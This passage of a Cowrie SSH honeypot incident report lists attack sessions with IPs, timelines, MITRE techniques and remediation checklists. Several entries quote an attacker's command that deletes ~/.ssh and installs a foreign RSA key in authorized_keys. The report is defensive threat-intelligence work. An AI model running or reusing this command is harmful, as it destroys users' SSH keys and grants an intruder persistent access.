- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1d21e800594

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:36` | `cowrie.session.connect` |
| `2026-08-24 01:33:36` | `cowrie.client.version` |
| `2026-08-24 01:33:36` | `cowrie.client.kex` |
| `2026-08-24 01:33:36` | `cowrie.login.success` |
| `2026-08-24 01:33:37` | `cowrie.session.params` |
| `2026-08-24 01:33:37` | `cowrie.command.input` |
| `2026-08-24 01:33:37` | `cowrie.log.closed` |
| `2026-08-24 01:33:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0546f3adb40

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:41` | `cowrie.session.connect` |
| `2026-08-24 01:33:41` | `cowrie.client.version` |
| `2026-08-24 01:33:41` | `cowrie.client.kex` |
| `2026-08-24 01:33:42` | `cowrie.login.success` |
| `2026-08-24 01:33:43` | `cowrie.session.params` |
| `2026-08-24 01:33:43` | `cowrie.command.input` |
| `2026-08-24 01:33:43` | `cowrie.log.closed` |
| `2026-08-24 01:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0e490d6cbe8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:47` | `cowrie.session.connect` |
| `2026-08-24 01:33:47` | `cowrie.client.version` |
| `2026-08-24 01:33:47` | `cowrie.client.kex` |
| `2026-08-24 01:33:47` | `cowrie.login.success` |
| `2026-08-24 01:33:48` | `cowrie.session.params` |
| `2026-08-24 01:33:48` | `cowrie.command.input` |
| `2026-08-24 01:33:48` | `cowrie.log.closed` |
| `2026-08-24 01:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82d6b70a881b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:52` | `cowrie.session.connect` |
| `2026-08-24 01:33:52` | `cowrie.client.version` |
| `2026-08-24 01:33:52` | `cowrie.client.kex` |
| `2026-08-24 01:33:53` | `cowrie.login.success` |
| `2026-08-24 01:33:53` | `cowrie.session.params` |
| `2026-08-24 01:33:53` | `cowrie.command.input` |
| `2026-08-24 01:33:53` | `cowrie.log.closed` |
| `2026-08-24 01:33:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44362cfb22c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:33 |
| **Last Seen** | 2026-08-24 01:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:33:57` | `cowrie.session.connect` |
| `2026-08-24 01:33:57` | `cowrie.client.version` |
| `2026-08-24 01:33:57` | `cowrie.client.kex` |
| `2026-08-24 01:33:58` | `cowrie.login.success` |
| `2026-08-24 01:33:59` | `cowrie.session.params` |
| `2026-08-24 01:33:59` | `cowrie.command.input` |
| `2026-08-24 01:33:59` | `cowrie.log.closed` |
| `2026-08-24 01:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca2d2e3f65d0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:34 |
| **Last Seen** | 2026-08-24 01:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:34:03` | `cowrie.session.connect` |
| `2026-08-24 01:34:03` | `cowrie.client.version` |
| `2026-08-24 01:34:03` | `cowrie.client.kex` |
| `2026-08-24 01:34:03` | `cowrie.login.success` |
| `2026-08-24 01:34:04` | `cowrie.session.params` |
| `2026-08-24 01:34:04` | `cowrie.command.input` |
| `2026-08-24 01:34:04` | `cowrie.log.closed` |
| `2026-08-24 01:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e79f2f965f52

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:34 |
| **Last Seen** | 2026-08-24 01:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:34:08` | `cowrie.session.connect` |
| `2026-08-24 01:34:08` | `cowrie.client.version` |
| `2026-08-24 01:34:08` | `cowrie.client.kex` |
| `2026-08-24 01:34:08` | `cowrie.login.success` |
| `2026-08-24 01:34:09` | `cowrie.session.params` |
| `2026-08-24 01:34:09` | `cowrie.command.input` |
| `2026-08-24 01:34:09` | `cowrie.log.closed` |
| `2026-08-24 01:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd77225e257

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:34 |
| **Last Seen** | 2026-08-24 01:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:34:13` | `cowrie.session.connect` |
| `2026-08-24 01:34:13` | `cowrie.client.version` |
| `2026-08-24 01:34:13` | `cowrie.client.kex` |
| `2026-08-24 01:34:14` | `cowrie.login.success` |
| `2026-08-24 01:34:14` | `cowrie.session.params` |
| `2026-08-24 01:34:15` | `cowrie.command.input` |
| `2026-08-24 01:34:15` | `cowrie.log.closed` |
| `2026-08-24 01:34:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6d84ee7ebf3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:34 |
| **Last Seen** | 2026-08-24 01:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:34:18` | `cowrie.session.connect` |
| `2026-08-24 01:34:18` | `cowrie.client.version` |
| `2026-08-24 01:34:18` | `cowrie.client.kex` |
| `2026-08-24 01:34:19` | `cowrie.login.success` |
| `2026-08-24 01:34:20` | `cowrie.session.params` |
| `2026-08-24 01:34:20` | `cowrie.command.input` |
| `2026-08-24 01:34:20` | `cowrie.log.closed` |
| `2026-08-24 01:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c78a8b8b094

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:34 |
| **Last Seen** | 2026-08-24 01:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:34:24` | `cowrie.session.connect` |
| `2026-08-24 01:34:24` | `cowrie.client.version` |
| `2026-08-24 01:34:24` | `cowrie.client.kex` |
| `2026-08-24 01:34:24` | `cowrie.login.success` |
| `2026-08-24 01:34:25` | `cowrie.session.params` |
| `2026-08-24 01:34:25` | `cowrie.command.input` |
| `2026-08-24 01:34:25` | `cowrie.log.closed` |
| `2026-08-24 01:34:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da762fc3f9b8

| Field | Detail |
|---|---|
| **Source IP** | `15.235.192[.]186` |
| **First Seen** | 2026-08-24 01:35 |
| **Last Seen** | 2026-08-24 01:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:35:46` | `cowrie.session.connect` |
| `2026-08-24 01:35:46` | `cowrie.client.version` |
| `2026-08-24 01:35:46` | `cowrie.client.kex` |
| `2026-08-24 01:35:47` | `cowrie.login.success` |
| `2026-08-24 01:35:48` | `cowrie.session.params` |
| `2026-08-24 01:35:48` | `cowrie.command.input` |
| `2026-08-24 01:35:48` | `cowrie.command.failed` |
| `2026-08-24 01:35:48` | `cowrie.log.closed` |
| `2026-08-24 01:35:49` | `cowrie.session.params` |
| `2026-08-24 01:35:49` | `cowrie.command.input` |
| `2026-08-24 01:35:49` | `cowrie.session.file_download` |
| `2026-08-24 01:35:49` | `cowrie.log.closed` |
| `2026-08-24 01:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `15.235.192[.]186` to AbuseIPDB if not already reported
- [ ] Block `15.235.192[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98f268234955

| Field | Detail |
|---|---|
| **Source IP** | `15.235.192[.]186` |
| **First Seen** | 2026-08-24 01:35 |
| **Last Seen** | 2026-08-24 01:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:35:50` | `cowrie.session.connect` |
| `2026-08-24 01:35:50` | `cowrie.client.version` |
| `2026-08-24 01:35:50` | `cowrie.client.kex` |
| `2026-08-24 01:35:51` | `cowrie.login.success` |
| `2026-08-24 01:35:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `15.235.192[.]186` to AbuseIPDB if not already reported
- [ ] Block `15.235.192[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f527934f0a2

| Field | Detail |
|---|---|
| **Source IP** | `15.235.192[.]186` |
| **First Seen** | 2026-08-24 01:35 |
| **Last Seen** | 2026-08-24 01:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:35:51` | `cowrie.session.connect` |
| `2026-08-24 01:35:51` | `cowrie.client.version` |
| `2026-08-24 01:35:51` | `cowrie.client.kex` |
| `2026-08-24 01:35:52` | `cowrie.login.success` |
| `2026-08-24 01:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `15.235.192[.]186` to AbuseIPDB if not already reported
- [ ] Block `15.235.192[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84f16ecf9fb1

| Field | Detail |
|---|---|
| **Source IP** | `121.159.71[.]249` |
| **First Seen** | 2026-08-24 01:36 |
| **Last Seen** | 2026-08-24 01:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:36:00` | `cowrie.session.connect` |
| `2026-08-24 01:36:01` | `cowrie.client.version` |
| `2026-08-24 01:36:01` | `cowrie.client.kex` |
| `2026-08-24 01:36:03` | `cowrie.login.success` |
| `2026-08-24 01:36:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.159.71[.]249` to AbuseIPDB if not already reported
- [ ] Block `121.159.71[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ce1993fe35e

| Field | Detail |
|---|---|
| **Source IP** | `61.220.35[.]158` |
| **First Seen** | 2026-08-24 01:36 |
| **Last Seen** | 2026-08-24 01:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:36:04` | `cowrie.session.connect` |
| `2026-08-24 01:36:05` | `cowrie.client.version` |
| `2026-08-24 01:36:05` | `cowrie.client.kex` |
| `2026-08-24 01:36:08` | `cowrie.login.success` |
| `2026-08-24 01:36:09` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:36:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.220.35[.]158` to AbuseIPDB if not already reported
- [ ] Block `61.220.35[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0db160cf548

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]11` |
| **First Seen** | 2026-08-24 01:38 |
| **Last Seen** | 2026-08-24 01:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:38:41` | `cowrie.session.connect` |
| `2026-08-24 01:38:41` | `cowrie.client.version` |
| `2026-08-24 01:38:41` | `cowrie.client.kex` |
| `2026-08-24 01:38:41` | `cowrie.login.success` |
| `2026-08-24 01:38:42` | `cowrie.session.params` |
| `2026-08-24 01:38:42` | `cowrie.command.input` |
| `2026-08-24 01:38:42` | `cowrie.command.failed` |
| `2026-08-24 01:38:42` | `cowrie.log.closed` |
| `2026-08-24 01:38:42` | `cowrie.session.params` |
| `2026-08-24 01:38:42` | `cowrie.command.input` |
| `2026-08-24 01:38:42` | `cowrie.session.file_download` |
| `2026-08-24 01:38:42` | `cowrie.log.closed` |
| `2026-08-24 01:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-928dd5cd9926

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]11` |
| **First Seen** | 2026-08-24 01:38 |
| **Last Seen** | 2026-08-24 01:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:38:42` | `cowrie.session.connect` |
| `2026-08-24 01:38:42` | `cowrie.client.version` |
| `2026-08-24 01:38:42` | `cowrie.client.kex` |
| `2026-08-24 01:38:43` | `cowrie.login.success` |
| `2026-08-24 01:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad8fc4a468da

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]11` |
| **First Seen** | 2026-08-24 01:38 |
| **Last Seen** | 2026-08-24 01:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:38:43` | `cowrie.session.connect` |
| `2026-08-24 01:38:43` | `cowrie.client.version` |
| `2026-08-24 01:38:43` | `cowrie.client.kex` |
| `2026-08-24 01:38:43` | `cowrie.login.success` |
| `2026-08-24 01:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9f01cc8f184

| Field | Detail |
|---|---|
| **Source IP** | `107.150.103[.]210` |
| **First Seen** | 2026-08-24 01:38 |
| **Last Seen** | 2026-08-24 01:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:38:55` | `cowrie.session.connect` |
| `2026-08-24 01:38:55` | `cowrie.client.version` |
| `2026-08-24 01:38:55` | `cowrie.client.kex` |
| `2026-08-24 01:38:55` | `cowrie.login.success` |
| `2026-08-24 01:38:55` | `cowrie.session.params` |
| `2026-08-24 01:38:55` | `cowrie.command.input` |
| `2026-08-24 01:38:55` | `cowrie.command.failed` |
| `2026-08-24 01:38:56` | `cowrie.log.closed` |
| `2026-08-24 01:38:56` | `cowrie.session.params` |
| `2026-08-24 01:38:56` | `cowrie.command.input` |
| `2026-08-24 01:38:56` | `cowrie.session.file_download` |
| `2026-08-24 01:38:56` | `cowrie.log.closed` |
| `2026-08-24 01:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.103[.]210` to AbuseIPDB if not already reported
- [ ] Block `107.150.103[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c49d460bd1

| Field | Detail |
|---|---|
| **Source IP** | `107.150.103[.]210` |
| **First Seen** | 2026-08-24 01:39 |
| **Last Seen** | 2026-08-24 01:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:39:04` | `cowrie.session.connect` |
| `2026-08-24 01:39:04` | `cowrie.client.version` |
| `2026-08-24 01:39:04` | `cowrie.client.kex` |
| `2026-08-24 01:39:04` | `cowrie.login.success` |
| `2026-08-24 01:39:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.103[.]210` to AbuseIPDB if not already reported
- [ ] Block `107.150.103[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b67bc411bf92

| Field | Detail |
|---|---|
| **Source IP** | `107.150.103[.]210` |
| **First Seen** | 2026-08-24 01:39 |
| **Last Seen** | 2026-08-24 01:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:39:04` | `cowrie.session.connect` |
| `2026-08-24 01:39:04` | `cowrie.client.version` |
| `2026-08-24 01:39:04` | `cowrie.client.kex` |
| `2026-08-24 01:39:04` | `cowrie.login.success` |
| `2026-08-24 01:39:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.150.103[.]210` to AbuseIPDB if not already reported
- [ ] Block `107.150.103[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9be1518d01f7

| Field | Detail |
|---|---|
| **Source IP** | `103.7.60[.]253` |
| **First Seen** | 2026-08-24 01:39 |
| **Last Seen** | 2026-08-24 01:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:39:42` | `cowrie.session.connect` |
| `2026-08-24 01:39:42` | `cowrie.client.version` |
| `2026-08-24 01:39:42` | `cowrie.client.kex` |
| `2026-08-24 01:39:44` | `cowrie.login.success` |
| `2026-08-24 01:39:44` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.7.60[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.7.60[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-746b1e541853

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]4` |
| **First Seen** | 2026-08-24 01:39 |
| **Last Seen** | 2026-08-24 01:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:39:49` | `cowrie.session.connect` |
| `2026-08-24 01:39:50` | `cowrie.client.version` |
| `2026-08-24 01:39:50` | `cowrie.client.kex` |
| `2026-08-24 01:39:53` | `cowrie.login.success` |
| `2026-08-24 01:39:53` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32430d526952

| Field | Detail |
|---|---|
| **Source IP** | `122.160.15[.]31` |
| **First Seen** | 2026-08-24 01:39 |
| **Last Seen** | 2026-08-24 01:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:39:54` | `cowrie.session.connect` |
